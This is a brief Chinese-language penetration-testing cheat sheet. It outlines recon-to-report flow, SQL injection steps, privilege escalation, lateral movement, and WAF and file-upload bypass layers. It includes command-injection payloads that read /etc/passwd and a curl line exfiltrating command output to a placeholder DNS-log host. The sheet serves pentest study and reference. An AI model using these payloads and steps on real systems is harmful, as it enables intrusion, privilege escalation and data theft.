# 方法论速查

## 渗透测试完整流程

```
信息收集(被动→主动→JS分析) → 漏洞探测(自动→手工) → 利用(最小化) → 后渗透(提权→横向→持久化) → 报告
```

## 攻击优先级

```
RCE > 文件写入 > 认证绕过 > SQL注入 > SSRF > 信息泄露 > XSS > 越权
```

## SQL注入五步法

```
1. 找点(所有入口) → 2. 确认数据库类型 → 3. 提数据(联合/报错/时间/布尔) → 4. WAF绕过矩阵 → 5. sqlmap自动化
```

## 提权路径

```
Linux: sudo -l → SUID(find / -perm -4000) → 内核(uname -r) → Cron → 敏感文件 → 通配符注入
Windows: whoami /priv → Potato → 服务路径 → AlwaysInstallElevated → 内核
```

## 横向移动路径

```
凭据搜集 → SSH密钥/密码 → PTH/PTT → Kerberoasting → BloodHound → DCSync
```

## WAF绕过四层

```
编码层 → 语义层 → 协议层 → 入口切换
```

## 命令注入绕过

```
; | || && `cmd` $(cmd) %0a %0d
空格: ${IFS} %09 {cat,/etc/passwd}
cat被过滤: tac/head/tail/more/strings/base64
无回显: DNS外带 curl `whoami`.{dnslog}
```

## 文件上传五层

```
客户端JS → 扩展名黑名单(.php5) → Content-Type(image/jpeg) → 文件头(GIF89a) → 内容检测(变量函数)
```